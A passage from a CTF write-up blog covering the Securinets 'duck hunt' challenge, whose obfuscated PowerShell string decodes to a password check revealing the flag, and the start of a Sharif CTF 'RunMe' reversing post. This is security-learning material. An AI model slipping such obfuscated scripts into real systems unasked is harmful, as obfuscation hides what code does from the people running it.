class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">]</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">\"</span><span class=\"p\">\n</span></code></pre></div></div>\n\n<p>Unpacking is simple. Just run it in powershell as it’s written in payload.\n<img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/run.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] powershell run</p>\n\n<p>If “[CHar]” type values are output, the user can get the input value and check the comparison code. Within that code we can get the flag.</p>\n\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/type.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] result of run</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$flag</span> <span class=\"o\">=</span> Read-Host-Prompt <span class=\"s1\">'Enter the password'</span>\nIf <span class=\"o\">(</span>flag <span class=\"nt\">-eq</span> <span class=\"s1\">'Flag{is_a_rubber_ducky_used_somewhere!}'</span>\n</code></pre></div></div>\n<p><img src=\"/images/2018-03-26-Securinets-CTF-duck-hunt-300/flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] flag</p>\n\n<p align=\"right\"><strong>Flag{is_a_rubber_ducky_used_somewhere!}</strong></p>\n\n    <article>\n    <div class=\"post-more\">\n      \n      <a href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      \n      <a href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  \n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n        [2018_Sharif_CTF] RunMe(50)\n      </a>\n    </h1>\n\n    <span class=\"post-date\">16 Feb 2018</span>\n     |\n    \n    <a href=\"/blog/tags/#reversing\" class=\"post-tag\">Reversing</a>\n    \n    <a href=\"/blog/tags/#string\" class=\"post-tag\">string</a>\n    \n    \n\n    <article>\n      <h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Run the attached file. If you can, you will capture the flag.<br />\nNote: Apply the minimum changes to make the file executable. Then, the mentioned hash function is md5. Be sure to run it on a real Windows OS (not Wine, etc.)</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>binary를 정상적으로 실행시키는 것이 전부인 문제. PE 파일임을 알 수 있다. real Windows OS 에서 실행해야 한다고 명시되어 있지만, 가상 환경에서 문제 없이 돌아간다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Reversing/50_Run me\nexiftool ./RunMe2.exe\nExifTool Version Number         : 10.55\nFile Name                       : RunMe2.exe\nDirectory                       : <span class=\"nb\">.</span>\nFile Size                       : 70 kB\nFile Modification Date/Time     : 2018:02:11 19:13:17+09:00\nFile Access Date/Time           : 2018:02:16 15:36:30+09:00\nFile Inode Change Date/Time     : 2018:02:11 19:13:17+09:00\nFile Permissions                : rw-r--r--\nFile Type                       : Win32 EXE\nFile Type Extension             : exe\nMIME Type                       : application/octet-stream\nMachine Type                    : Intel 386 or later, and compatibles\nTime Stamp                      : 2018:01:30 13:22:02+09:00\nPE Type                         : PE32\nLinker Version                  : 14.0\nCode Size                       : 41984\nInitialized Data Size           : 31744\nUninitialized Data Size         : 0\nEntry Point                     : 0x1250\nOS Version                      : 5.1\nImage Version                   : 0.0\nSubsystem Version               : 5.1\nSubsystem                       : Native\n</code></pre></div></div>\n\n<p>실행을 해보면, 정상적으로 동작하지 않는 